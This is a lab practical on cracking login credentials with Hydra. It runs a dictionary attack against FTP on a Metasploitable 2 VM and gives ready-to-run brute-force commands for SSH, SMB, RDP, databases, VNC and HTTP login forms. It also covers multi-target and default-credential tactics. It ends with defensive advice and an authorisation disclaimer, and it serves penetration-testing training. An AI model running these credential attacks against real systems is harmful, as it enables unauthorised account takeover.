# Practical 10: Cracking Login Credentials using hydra

## Objective

In this practical we use **Hydra** (`hydra`) to perform an online brute-force / dictionary attack against a network service. Given a target host, a username list, and a password list, Hydra tries every combination against the service and reports any successful login.

The example service used here is **FTP** on a Metasploitable 2 target, but the same workflow applies to SSH, Telnet, HTTP forms, SMB, RDP, MySQL, MS-SQL, VNC, and many more.

---

## Tool Overview

**Hydra (THC-Hydra)** is a fast, parallelised network login cracker that supports dozens of protocols. It is the de-facto online-brute-force tool in the Kali/Parrot toolkit.

**Capabilities:**

- Single username + password list, or full user-list × password-list combinations.
- Multi-threaded — many parallel connections per host.
- Multi-target — read a list of hosts and attack them in parallel.
- Supports many protocols: `ftp`, `ssh`, `telnet`, `smtp`, `pop3`, `imap`, `http-get`, `http-post-form`, `https-*`, `smb`, `rdp`, `mssql`, `mysql`, `postgres`, `vnc`, `snmp`, `ldap`, `redis`, `cisco`, `mongodb`, and more.
- Resume failed sessions, restore state, log output to file.

> Hydra performs **online** attacks — it sends real authentication attempts to the target service. This is loud, often triggers lockouts/IDS alerts, and is illegal without permission.

---

## Prerequisites

- A Linux system (Kali / Parrot / Ubuntu / Debian).
- `hydra` installed (pre-installed on Kali and Parrot).

```bash
which hydra
hydra -h | head -20
```

Install if missing:

```bash
sudo apt update
sudo apt install hydra -y
```

- A target you are authorised to test. The example uses **Metasploitable 2** in an isolated VM lab.
- Two text files:
  - `users.txt` — one username per line
  - `pass.txt` — one password per line

Create simple sample files:

```bash
cat > /root/Desktop/users.txt <<EOF
root
admin
msfadmin
user
ftpuser
anonymous
EOF

cat > /root/Desktop/pass.txt <<EOF
password
123456
admin
msfadmin
toor
letmein
qwerty
ftp
EOF
```

---

## Step 1: Discover the Target Service with Nmap

Confirm FTP (TCP 21) is open on the target before attacking it:

```bash
nmap -sV -p 21 192.168.0.103
```

**Sample output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.0.103
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

Service detection performed. Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

FTP is open and running `vsftpd 2.3.4` — a good candidate for credential attack.

You can also test anonymous login first (it's free and often works on misconfigured boxes):

```bash
ftp 192.168.0.103
# Name: anonymous
# Password: anonymous@
```

---

## Step 2: Hydra Syntax

```
hydra [options] -L users.txt -P pass.txt <target> <service>
```

### Common Options

| Flag        | Meaning                                                       |
| ----------- | ------------------------------------------------------------- |
| `-l <user>` | Single username                                               |
| `-L <file>` | File containing usernames (one per line)                      |
| `-p <pass>` | Single password                                               |
| `-P <file>` | File containing passwords                                     |
| `-C <file>` | "login:pass" combo file (replaces both `-L` and `-P`)         |
| `-s <port>` | Target port (only if non-standard)                            |
| `-t <num>`  | Number of parallel tasks per target (default 16; 4 for SSH)   |
| `-T <num>`  | Total parallel connections across all targets                 |
| `-v` / `-V` | Verbose / show each login+pass attempt                        |
| `-f`        | Stop after the first successful login per host                |
| `-F`        | Stop globally after the first successful login                |
| `-o <file>` | Write successful pairs to file                                |
| `-e nsr`    | Try empty (`n`), same-as-login (`s`), reversed (`r`) passwords |
| `-M <file>` | Attack multiple targets listed in file                        |
| `-R`        | Restore a previously aborted session                          |
| `-w <sec>`  | Wait time per connection                                      |

### Service Examples

```
ftp, ssh, telnet, smtp, pop3, imap, smb, rdp,
mysql, mssql, postgres, mongodb, redis,
vnc, snmp, ldap2, http-get, http-post-form
```

---

## Step 3: Run Hydra against FTP

Run the attack from the practical:

```bash
hydra -s 21 -v -L /root/Desktop/users.txt -P /root/Desktop/pass.txt -t 60 192.168.0.103 ftp
```

| Part of the command           | Purpose                                       |
| ----------------------------- | --------------------------------------------- |
| `-s 21`                       | Target port (21 = FTP; optional if default)   |
| `-v`                          | Verbose — show each attempt and status        |
| `-L /root/Desktop/users.txt`  | Username list                                 |
| `-P /root/Desktop/pass.txt`   | Password list                                 |
| `-t 60`                       | 60 parallel tasks                             |
| `192.168.0.103`               | Target host                                   |
| `ftp`                         | Service to attack                             |

**Sample output (truncated):**

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in
military or secret service organizations, or for illegal purposes.

Hydra starting at 2026-05-19 12:14:21
[DATA] max 48 tasks per 1 server, overall 48 tasks, 48 login tries (l:6/p:8), ~1 try per task
[DATA] attacking ftp://192.168.0.103:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done

[ATTEMPT] target 192.168.0.103 - login "root" - pass "password" - 1 of 48 [child 0]
[ATTEMPT] target 192.168.0.103 - login "root" - pass "123456"   - 2 of 48 [child 1]
[ATTEMPT] target 192.168.0.103 - login "root" - pass "admin"    - 3 of 48 [child 2]
...
[ATTEMPT] target 192.168.0.103 - login "msfadmin" - pass "msfadmin" - 27 of 48 [child 4]
[21][ftp] host: 192.168.0.103   login: msfadmin   password: msfadmin
[ATTEMPT] target 192.168.0.103 - login "user" - pass "user" - 33 of 48 [child 1]
[21][ftp] host: 192.168.0.103   login: user       password: user
...

1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-19 12:14:38
```

### Confirmation Message

The key lines confirming success:

```
[21][ftp] host: 192.168.0.103   login: msfadmin   password: msfadmin
[21][ftp] host: 192.168.0.103   login: user       password: user
```

Format: `[<port>][<service>] host: <target>   login: <username>   password: <password>`.

### Save Results to a File

```bash
hydra -s 21 -L users.txt -P pass.txt -t 60 \
      -o ftp_creds.txt \
      192.168.0.103 ftp
cat ftp_creds.txt
```

```
# Hydra v9.5 run at 2026-05-19 on 192.168.0.103 ftp (-L users.txt -P pass.txt -o ftp_creds.txt)
[21][ftp] host: 192.168.0.103   login: msfadmin   password: msfadmin
[21][ftp] host: 192.168.0.103   login: user       password: user
```

### Verify the Credential

```bash
ftp 192.168.0.103
# Name: msfadmin
# Password: msfadmin
# 230 Login successful.
```

---

## Step 4: Hydra Against Other Common Services

The same `-L/-P` recipe works against many services — only the service name (and sometimes port) changes.

**SSH:**

```bash
hydra -L users.txt -P pass.txt -t 4 192.168.0.103 ssh
```

> Use `-t 4` for SSH; many SSH servers throttle/reject high concurrency.

**Telnet:**

```bash
hydra -L users.txt -P pass.txt -t 16 192.168.0.103 telnet
```

**SMB (Windows shares):**

```bash
hydra -L users.txt -P pass.txt 192.168.0.50 smb
```

**RDP:**

```bash
hydra -L users.txt -P pass.txt -t 1 rdp://192.168.0.50
```

**MySQL:**

```bash
hydra -l root -P pass.txt 192.168.0.103 mysql
```

**MS-SQL:**

```bash
hydra -L users.txt -P pass.txt 192.168.0.50 mssql
```

**PostgreSQL:**

```bash
hydra -l postgres -P pass.txt 192.168.0.103 postgres
```

**VNC (password only, no username):**

```bash
hydra -P pass.txt 192.168.0.103 vnc
```

**HTTP Basic Auth (e.g. router/admin panels):**

```bash
hydra -L users.txt -P pass.txt 192.168.0.1 http-get /admin
```

**HTTP POST form login (DVWA-style):**

```bash
hydra -L users.txt -P pass.txt 192.168.0.103 \
  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

The string format is:

```
<path>:<post-params>:<failure-string>
```

- `^USER^` and `^PASS^` are placeholders Hydra substitutes.
- `Login failed` is the response string that indicates a wrong credential. Replace with whatever the application returns for failures.

---

## Step 5: Useful Tactical Tweaks

### 5.1 Stop on First Hit (`-f`)

```bash
hydra -f -L users.txt -P pass.txt 192.168.0.103 ftp
```

Saves time when you only need a single working credential.

### 5.2 Try the Easy Cases First (`-e nsr`)

```bash
hydra -L users.txt -e nsr 192.168.0.103 ftp
```

- `n` — empty password
- `s` — password same as username (e.g. `admin:admin`)
- `r` — reversed username (e.g. `admin:nimda`)

These three alone often produce a hit on misconfigured boxes.

### 5.3 Combo File (`-C`)

A file with `user:pass` per line — useful for default-credential lists:

```bash
cat > defaults.txt <<EOF
admin:admin
admin:password
root:root
root:toor
msfadmin:msfadmin
EOF

hydra -C defaults.txt 192.168.0.103 ftp
```

### 5.4 Attack Many Targets (`-M`)

```bash
cat > targets.txt <<EOF
192.168.0.103
192.168.0.104
192.168.0.105
EOF

hydra -L users.txt -P pass.txt -M targets.txt ftp
```

### 5.5 Resume a Crashed Run

```bash
hydra -R
```

Hydra automatically writes a `hydra.restore` file mid-run; `-R` resumes from it.

---

## Step 6: Pair with Wordlists Built in Earlier Practicals

The wordlists generated in Practicals 7–9 plug directly into Hydra:

```bash
# CUPP profile-based list (from Practical 7)
hydra -L users.txt -P ~/wordlists/john_doe_cupp.txt 192.168.0.103 ssh

# crunch pattern list (from Practical 8)
crunch 6 6 -t admin% | hydra -L users.txt -P - 192.168.0.103 ftp

# cewl site-scraped list (from Practical 9)
hydra -L users.txt -P wordlist.txt 192.168.0.103 ssh
```

The `-P -` syntax reads passwords from stdin, so you can pipe `crunch` output directly without writing it to disk.

---

## Step 7: GUI Alternative — `xhydra`

For people who prefer a graphical interface:

```bash
xhydra
```

Configure target, protocol, wordlists, and tuning in tabs, then click **Start**. Output goes to the **Output** tab; successful matches appear with the same `[port][service] host: ... login: ... password: ...` format.

---

## Quick Reference

```bash
# 1. FTP (the classic command)
hydra -s 21 -v -L users.txt -P pass.txt -t 60 192.168.0.103 ftp

# 2. SSH (low concurrency!)
hydra -L users.txt -P pass.txt -t 4 192.168.0.103 ssh

# 3. SMB / Windows shares
hydra -L users.txt -P pass.txt 192.168.0.50 smb

# 4. RDP
hydra -L users.txt -P pass.txt -t 1 rdp://192.168.0.50

# 5. Default-creds combo file
hydra -C defaults.txt 192.168.0.103 ftp

# 6. HTTP POST form
hydra -L users.txt -P pass.txt 192.168.0.103 \
  http-post-form "/login:user=^USER^&pwd=^PASS^:Login failed"

# 7. Stop on first hit + try easy passwords
hydra -f -e nsr -L users.txt -P pass.txt 192.168.0.103 ftp

# 8. Save results
hydra -L users.txt -P pass.txt -o creds.txt 192.168.0.103 ftp

# 9. Pipe crunch output (no disk usage)
crunch 6 6 -t admin% | hydra -l admin -P - 192.168.0.103 ftp

# 10. Resume aborted session
hydra -R
```

---

## Observations / Conclusion

Using Hydra against the Metasploitable target on FTP we successfully recovered the credentials `msfadmin:msfadmin` and `user:user` in seconds. Key takeaways:

1. Hydra's strength is **breadth** — one tool covers dozens of protocols with a consistent `-L / -P / -t` recipe.
2. The quality of the **wordlists** (users and passwords) is the single biggest factor in success — pair Hydra with CUPP, crunch, cewl, and breach lists.
3. **Concurrency tuning matters** — too high (`-t 60` on SSH) gets you locked out or banned; protocol-appropriate values (4 for SSH, 1 for RDP, 16–60 for FTP) keep the attack practical.
4. Hydra is **noisy** — every attempt is a real network request and shows up in auth logs, IDS, and rate-limit alerts.

---

## Defensive Recommendations

- **Enforce strong, long, unique passwords** and ban common/breach-list passwords at creation time.
- **Multi-Factor Authentication (MFA)** on every externally-exposed service — defeats Hydra outright.
- **Account lockout / progressive throttling** after a small number of failed attempts.
- **Rate-limit** logins per IP (e.g. `fail2ban`, `pam_tally2`, `sshguard`, WAF rules).
- **Disable insecure plaintext services** (FTP, Telnet, HTTP Basic) in favour of FTPS/SFTP, SSH, and HTTPS.
- **Restrict management ports** (22, 21, 3389, 445, 1433, 3306) to trusted networks / VPN only.
- **Log and alert** on repeated failed authentications — Hydra is loud, so detection is feasible if logging is in place.
- **Honeytokens / honey-accounts** (e.g. `admin` with a unique password) can fire instant alerts on a Hydra attempt.

---

## Disclaimer

This practical is for **educational purposes** only and must be performed only on systems and accounts you own or have explicit written authorisation to test. Online brute-force attacks against systems you do not control are illegal under laws such as the Information Technology Act in India and the Computer Fraud and Abuse Act in the US. Even a "successful" credential discovered without authorisation must not be used to log in.
